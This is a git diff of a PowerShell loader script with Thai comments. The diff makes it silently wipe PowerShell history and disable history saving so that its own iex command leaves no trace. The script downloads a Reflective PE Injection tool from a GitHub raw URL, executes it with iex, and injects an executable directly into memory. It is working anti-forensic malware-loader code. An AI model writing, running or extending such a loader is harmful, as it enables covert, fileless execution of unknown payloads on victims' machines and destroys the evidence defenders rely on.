@@ -16,16 +16,21 @@ Write-Host "  ========================================================" -Foregro
 Write-Host ""
 
 # ==========================================
-# HISTORY CLEANUP (บังคับลบประวัติ)
+# AUTO HISTORY CLEANUP (ลบประวัติอัตโนมัติแบบเงียบๆ)
 # ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Fetching PowerShell history..." -ForegroundColor White
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping PowerShell history traces..." -ForegroundColor White
 
 $historyPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $historyPath) {
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "!" -ForegroundColor Red -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Notepad opened. Please clear your link, SAVE, and CLOSE Notepad." -ForegroundColor Red
+    # 1. เคลียร์ข้อความในไฟล์ประวัติทิ้งให้เป็นหน้าขาว
+    Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
+    # 2. ลบประวัติการพิมพ์ในหน้าต่างปัจจุบัน
+    Clear-History
+    # 3. บังคับไม่ให้ PowerShell เซฟคำสั่ง iex ของเราลงไปใหม่ตอนปิดโปรแกรม
+    Set-PSReadLineOption -HistorySaveStyle SaveNothing
     
-    Start-Process notepad.exe -ArgumentList $historyPath -Wait 
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " History cleaned securely." -ForegroundColor Green
+    Start-Sleep -Milliseconds 500
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " History wiped perfectly. No trace left." -ForegroundColor Green
 }
 Write-Host ""
 
@@ -37,7 +42,7 @@ Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline;
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
-    # 1. โหลดเครื่องมือ Reflective PE Injection กลับมา
+    # 1. โหลดเครื่องมือ Reflective PE Injection
     $InjectorURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/refs/heads/main/2squad.txt"
     iex (New-Object Net.WebClient).DownloadString($InjectorURL)
 
@@ -52,7 +57,7 @@ try {
     
     Start-Sleep -Seconds 2
     
-    # 3. สั่งรัน EXE เข้าไปใน Memory ของ PowerShell ตัวเองโดยตรง (ไม่ต้องใช้ PID แล้ว)
+    # 3. สั่งรัน EXE เข้าไปใน Memory โดยตรง
     Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ForceASLR
     
 } catch {
